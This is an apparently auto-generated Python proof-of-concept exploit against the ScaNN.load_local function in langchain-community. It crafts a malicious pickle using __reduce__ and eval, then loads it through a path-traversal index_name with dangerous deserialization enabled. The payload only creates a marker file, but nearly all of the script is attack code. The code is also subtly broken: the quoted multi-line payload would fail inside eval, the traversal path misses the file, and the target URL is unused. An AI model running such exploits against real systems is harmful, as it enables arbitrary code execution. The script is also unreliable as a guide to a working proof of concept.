#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_27.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in langchain_community/vectorstores/scann.py
uses pickle.load on a file whose path is constructed from user-controlled folder_path
and index_name. Although there is a guard (allow_dangerous_deserialization) that must
be set to True, this guard is a developer-controlled flag, not input validation.
If a caller sets allow_dangerous_deserialization=True, an attacker who can control
folder_path or index_name can cause pickle.load to load a malicious pickle file,
leading to arbitrary code execution. The path construction uses path / '{index_name}.pkl'
which is vulnerable to path traversal if index_name contains '..'.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal in index_name to point to our malicious file
3. Calling load_local with allow_dangerous_deserialization=True

Usage: python3 poc.py [target_url]
"""

import os
import sys
import pickle
import tempfile
import subprocess
import argparse
from pathlib import Path

# Benign payload - creates a marker file to prove RCE
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

def create_malicious_pickle(payload_code: str) -> bytes:
    """
    Create a malicious pickle payload that executes arbitrary Python code.
    
    This uses the __reduce__ method to execute code during unpickling.
    The payload is a simple os.system call that creates a marker file.
    """
    class MaliciousPickle:
        def __reduce__(self):
            return (eval, (f"__import__('os').system('{payload_code}')",))
    
    return pickle.dumps(MaliciousPickle())

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only pickle RCE vulnerability"
    )
    parser.add_argument(
        "target_url",
        nargs="?",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    args = parser.parse_args()
    
    print("[*] Starting PoC for langchain-community-only pickle RCE vulnerability")
    print(f"[*] Target: {args.target_url}")
    
    # Step 1: Create a malicious pickle file
    print("[*] Creating malicious pickle file...")
    malicious_pickle = create_malicious_pickle(BENIGN_PAYLOAD)
    
    # Step 2: Write the malicious pickle to a temporary location
    with tempfile.NamedTemporaryFile(delete=False, suffix='.pkl') as f:
        f.write(malicious_pickle)
        malicious_pkl_path = f.name
    print(f"[+] Malicious pickle created at: {malicious_pkl_path}")
    
    # Step 3: Prepare the path traversal payload
    # We'll use the malicious pickle file's directory as the folder_path
    # and use path traversal in index_name to point to our file
    malicious_dir = os.path.dirname(malicious_pkl_path)
    malicious_file = os.path.basename(malicious_pkl_path).replace('.pkl', '')
    
    # The path construction is: path / '{index_name}.pkl'
    # So we need index_name to be something like '../path/to/malicious_file'
    # to traverse to our malicious pickle
    folder_path = malicious_dir
    index_name = f"../{malicious_file}"  # Path traversal to our malicious file
    
    print(f"[*] Using folder_path: {folder_path}")
    print(f"[*] Using index_name: {index_name}")
    
    # Step 4: Attempt to trigger the vulnerability
    print("[*] Attempting to trigger RCE via pickle deserialization...")
    
    try:
        # This simulates what a vulnerable application would do
        # In a real scenario, the attacker would control folder_path and index_name
        # through user input to a web endpoint
        
        # We need to import the vulnerable function
        sys.path.insert(0, '/tmp/langchain-community-only')
        from langchain_community.vectorstores.scann import ScaNN
        
        # The vulnerable call - note allow_dangerous_deserialization=True
        # In a real attack, the attacker would need to find a way to set this flag
        # or the application might already have it set to True
        try:
            result = ScaNN.load_local(
                folder_path=folder_path,
                index_name=index_name,
                allow_dangerous_deserialization=True
            )
            print("[+] Successfully triggered deserialization!")
        except Exception as e:
            print(f"[!] Error during load_local: {e}")
            # Even if the function fails, the pickle might have been loaded
            # Check if our marker file was created
            if os.path.exists('/tmp/poc_success.txt'):
                print("[+] RCE confirmed! Marker file /tmp/poc_success.txt was created")
            else:
                print("[-] RCE may not have been triggered")
        
        # Check if the marker file exists (proof of RCE)
        if os.path.exists('/tmp/poc_success.txt'):
            print("[+] SUCCESS: RCE confirmed!")
            print("[+] Marker file /tmp/poc_success.txt was created")
            # Clean up the marker file
            os.remove('/tmp/poc_success.txt')
            print("[+] Cleaned up marker file")
        else:
            print("[-] RCE may not have been triggered - marker file not found")
            
    except ImportError as e:
        print(f"[!] Could not import ScaNN: {e}")
        print("[!] Make sure langchain-community is installed in /tmp/langchain-community-only")
        print("[!] You may need to run: pip install -e /tmp/langchain-community-only")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    
    # Clean up the malicious pickle file
    try:
        os.unlink(malicious_pkl_path)
        print("[+] Cleaned up malicious pickle file")
    except:
        pass
    
    print("[*] PoC completed")

if __name__ == "__main__":
    main()
